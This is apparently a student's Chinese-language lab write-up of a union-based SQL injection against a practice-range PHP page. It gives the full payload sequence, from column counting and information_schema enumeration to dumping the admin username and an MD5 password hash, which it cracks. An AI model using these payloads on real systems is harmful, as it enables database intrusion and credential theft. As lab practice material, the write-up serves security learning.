-_-\.内网靶场练习：

构造 “http://..30.11:90/sec_show.php?cid=1&aid=1 ”判断注入点 id=-1 报错，有注入 构造“http://..30.11:90/sec_show.php?cid=1&aid=1 order by 21 ” order by 猜字段，一个个试出来，order by 22 报错 order by 21成功 共有21个字段 http://..30.11:90/sec_show.php?cid=1&aid=-1 union select 1,2,@@hostname,version(),5,user(),7,8,9,10,11,12,13,14,15,16,17,18,19,20 查看目标电脑用户名:@@hostname SQLInjection1 查看版本:version() 5.6.12-log 查询当前用户:user() root@127.0.0.1 数据库：database() sqlinj_1

" cid=1&aid=-1 union select 1,2,3,4,5,@@datadir,7,8,9,10,11,12,13,14,15,16,17,18,19,20 -- " 查看当前目录:@@datadir c:\wamp\bin\mysql\mysql5.6.12\data\

构造“cid=1&aid=-1%20union%20select%201,2,3,4,5,group_concat(schema_name),7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20information_schema.schemata” 发现页面上出现3 4 6 字段，说明这三处都可以进行注入：

通过注入查看sqlinj_1库里面的表 cid=1&aid=-1%20union%20select%201,2,3,table_name,5,table_schema,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema='sqlinj_1'-- 调用上面查询出sqlinj_1数据库查出库中wit_admin表

查看users表里面的列: "cid=1&aid=-1%20union%20select%201,2,3,table_name,5,column_name,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema='sqlinj_1' and table_name='wit_admin' --" 获取列名为adm_id

盲猜字段 adm_admin adm_pass cid=1&aid=-1%20union%20select%201,2,3,adm_user,5,adm_pass,7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20sqlinj_1.wit_admin --

账号：admin 密码：e10adc3949ba59abbe56e057f20f883e ----md5----> 123456
